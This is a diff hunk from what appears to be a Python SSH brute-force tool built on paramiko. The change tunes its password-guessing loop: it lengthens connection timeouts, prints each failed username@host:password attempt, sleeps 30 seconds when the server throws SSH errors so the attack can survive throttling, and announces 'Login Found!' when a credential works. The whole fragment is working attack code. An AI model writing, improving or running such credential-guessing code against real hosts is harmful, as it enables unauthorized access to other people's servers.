@@ -473,9 +473,11 @@ try:
                                     client = paramiko.SSHClient()
                                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                     try:
-                                        client.connect(hostname=target, username=username, password=password, timeout=5, banner_timeout=10)
-                                    except:
+                                        client.connect(hostname=target, username=username, password=password, timeout=60, banner_timeout=60)
+                                    except paramiko.AuthenticationException:
                                         print("[\u001b[31m-\u001b[0m] " + username + '@' + target + ':' + password)
+                                    except paramiko.ssh_exception.SSHException:
+                                        time.sleep(30)
                                     else:
                                         print("\n\nLogin Found!\n[\u001b[32m+\u001b[0m] " + username + '@' + target + ':' + password + '\n')
                                         break
